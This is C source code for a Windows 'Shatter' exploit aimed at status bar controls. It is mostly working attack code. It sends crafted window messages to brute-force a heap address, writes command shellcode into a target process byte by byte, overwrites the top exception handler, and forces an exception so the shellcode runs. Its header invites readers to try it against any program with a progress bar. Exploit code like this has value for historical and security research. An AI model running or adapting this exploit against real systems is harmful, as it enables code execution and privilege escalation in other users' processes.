/*************************************************************************************
* Statusbar Control Shatter exploit 
*
* Demonstrates the use of a combination of windows messages to;
* - brute force a useable heap address
* - place structure information inside a process
* - inject shellcode to known location
* - overwrite 4 bytes of a critical memory address
*
* 4 Variables need to be set for proper execution.
* - tWindow is the title of the programs main window
* - sehHandler is the critical address to overwrite
* - shellcodeaddr is the data space to inject the code
* - heapaddr is the base heap address to start brute forcing
*
* Local shellcode is Win2kSp4 ENG Hardcoded because of unicode issues
* Try it out against any program with a progress bar
*
*************************************************************************************/
#include <windows.h>
#include <commctrl.h>
#include <stdio.h>

// Local No Null Cmd Shellcode. 
BYTE exploit[] = "\x90\x33\xc9\x66\xb9\x36\x32\xc1\xe1\x09\x66\xb9\x63\x6d\x51\x54\xbb\x5c\x21\x9d\x77\x03\xd9\xff\xd3\xcc\x90";

char g_classNameBuf[ 256 ];
char tWindow[]="Main Window Title";// The name of the main window

long sehHandler = 0x7cXXXXXX; // Critical Address To Overwrite
long shellcodeaddr = 0x7fXXXXXX; // Known Writeable Space Or Global Space
unsigned long heapaddr = 0x00500000; // Base Heap Address
long mainhWnd;

void doWrite(HWND hWnd, long tByte,long address);
void BruteForceHeap(HWND hWnd);
void IterateWindows(long hWnd);
  
int main(int argc, char *argv[])
{
 
   HMODULE hMod;
   DWORD ProcAddr;
   long x;
	

   printf("%% Playing with status bar messages\n");
   printf("%% brett.moore@security-assessment.com\n\n");

   if (argc == 2)
	   sscanf(argv[1],"%lx",&heapaddr);	// Oddity

   printf("%% Using base heap address...0x%xh\n",heapaddr);
   printf("+ Finding %s Window...\n",tWindow);
   mainhWnd = (long)FindWindow(NULL,tWindow);

   if(mainhWnd == NULL)
   {
      printf("+ Couldn't Find %s Window\n",tWindow);
      return 0;
   }
   printf("+ Found Main Window At......0x%xh\n",mainhWnd);
   IterateWindows(mainhWnd);
   printf("+ Done...\n");
   
   return 0;
}

void BruteForceHeap(HWND hWnd, long tByte,long address)
{
	long retval;
	BOOL foundHeap = FALSE;
	char buffer[5000];
	memset(buffer,0,sizeof(buffer));

	while (!foundHeap)
	{
		printf("+ Trying Heap Address.......0x%xh ",heapaddr);

		memset(buffer,0x58,sizeof(buffer)-1);

		// Set Window Title
		SendMessage( mainhWnd,(UINT) WM_SETTEXT,0,&buffer);	
		// Set Part Contents	
		SendMessage((HWND) hWnd,(UINT) SB_SETTEXT,0,heapaddr);
		retval=SendMessage((HWND) hWnd,(UINT) SB_GETTEXTLENGTH ,0,0);
		printf("%d",retval);
		if(retval == 1)
		{
			// First Retval should be 1
			memset(buffer,0x80,sizeof(buffer)-1);
			// Set Window Title
			SendMessage( mainhWnd,(UINT) WM_SETTEXT,0,&buffer);	
			// Set Part Contents	
			SendMessage((HWND) hWnd,(UINT) SB_SETTEXT,0,heapaddr);
			retval=SendMessage((HWND) hWnd,(UINT) SB_GETTEXTLENGTH ,0,0);
			if(retval > 1)
			{
				// Second should be larger than 1
				printf(" : %d - Found Heap Address\n",retval);
				return(0);
			}
		}
		printf("\n");
		heapaddr += 2500;
	}
}


void doWrite(HWND hWnd, long tByte,long address)
{
	char buffer[5000];
	
	memset(buffer,0,sizeof(buffer));
	memset(buffer,tByte,sizeof(buffer)-1);
	// Set Window Title
	SendMessage( mainhWnd,(UINT) WM_SETTEXT,0,&buffer);	

	// Set Statusbar width
	SendMessage( hWnd,(UINT) SB_SETPARTS,1,heapaddr);
	SendMessage( hWnd,(UINT) SB_GETPARTS,1,address);
		
}

void IterateWindows(long hWnd)
{
   
	long childhWnd,looper;

	childhWnd = (long)GetNextWindow((HWND)hWnd,GW_CHILD);
	while (childhWnd != NULL)
	{
		IterateWindows(childhWnd);
		childhWnd = (long)GetNextWindow((HWND)childhWnd ,GW_HWNDNEXT);
	}

	GetClassName( (HWND)hWnd, g_classNameBuf, sizeof(g_classNameBuf) );
	if ( strcmp(g_classNameBuf, "msctls_statusbar32") ==0)
	{

		// Find Heap Address
		BruteForceHeap((HWND) hWnd);

		// Inject shellcode to known address
		printf("+ Sending shellcode to......0x%xh\n",shellcodeaddr);
		for (looper=0;looper<sizeof(exploit);looper++)
		 doWrite((HWND)hWnd, (long) exploit[looper],(shellcodeaddr + looper));
		// Overwrite SEH
		printf("+ Overwriting Top SEH.......0x%xh\n",sehHandler);

		doWrite((HWND)hWnd, ((shellcodeaddr) & 0xff),sehHandler);
		doWrite((HWND)hWnd, ((shellcodeaddr >> 8) & 0xff),sehHandler+1);
		doWrite((HWND)hWnd, ((shellcodeaddr >> 16) & 0xff),sehHandler+2);
		doWrite((HWND)hWnd, ((shellcodeaddr >> 24) & 0xff),sehHandler+3);
		// Cause exception
		printf("+ Forcing Unhandled Exception\n");
		SendMessage((HWND) hWnd,(UINT) SB_GETPARTS,1,1);
		printf("+ Done...\n");
		exit(0);
	}
}
